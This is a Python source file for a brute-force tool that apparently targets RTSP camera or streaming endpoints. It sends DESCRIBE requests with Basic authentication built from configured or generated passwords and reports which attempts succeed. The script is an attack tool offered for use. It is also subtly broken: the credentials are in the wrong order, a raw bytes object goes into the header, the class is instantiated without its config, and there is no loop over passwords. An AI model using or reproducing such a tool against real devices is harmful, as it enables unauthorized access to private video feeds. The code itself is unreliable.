import base64
import socket

from config import Config
from password_gen import PasswordGenerator

pass_gen = PasswordGenerator()


class RTSPBruteForce:
    def __init__(self, config):
        self.config = config
        self.characters = self.config.characters
        self.digits = self.config.digits
        self.symbols = self.config.symbols
        self.length = self.config.length

    def get_response(self, response):
        if '200 OK' in str(response):
            return '200 OK'
        elif '401 Unauthorized' in str(response):
            return '401 Unauthorized'
        else:
            return response

    def base64encode(self):
        username = self.config.rtsp_username
        password = self.config.rtsp_password
        credentials = f'{password}:{username}'
        credentials_bytes = credentials.encode('ascii')
        base64_bytes = base64.b64encode(credentials_bytes)
        return base64_bytes

    def brute_force_rtsp(self):
        try:
            b64 = self.base64encode()
            dest = f"DESCRIBE rtsp://{self.config.rtsp_ip}:{self.config.rtsp_port}/unicast RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {b64}\r\n\r\n"
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.config.rtsp_ip, self.config.rtsp_port))
            s.send(dest.encode())
            response = s.recv(512)
            print(self.get_response(response))
        except socket.error as e:
            print(e)
        except (ConnectionRefusedError, ConnectionResetError) as e:
            print(
                f'{e}: {self.config.rtsp_ip}:{self.config.rtsp_port} - {self.config.rtsp_username}:{self.config.rtsp_password}')
        except Exception as e:
            print(e)


if __name__ == '__main__':
    configs = Config()
    if configs.generate_paswords:
        pass_gen = PasswordGenerator()
        pass_gen.generate_password_dict()
    brute_forcer = RTSPBruteForce()
    brute_forcer.brute_force_rtsp()
